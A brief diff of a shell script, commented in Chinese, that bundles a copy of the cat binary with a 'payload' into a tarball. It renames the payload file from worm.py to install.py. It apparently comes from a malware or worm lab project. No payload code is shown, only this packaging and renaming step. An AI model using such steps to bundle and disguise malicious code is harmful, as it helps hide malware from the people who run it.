@@ -6,7 +6,7 @@ size=$(wc -c temp_cat | awk '{print $1}')
 space=`expr $size - 8`
 
 # 壓縮 cat 和 payload
-tar -cvzf temp_cat.tar.gz temp_cat worm.py > /dev/null 2>&1
+tar -cvzf temp_cat.tar.gz temp_cat install.py > /dev/null 2>&1
 
 # 刪掉不需要的檔案
 #rm temp_cat test.py
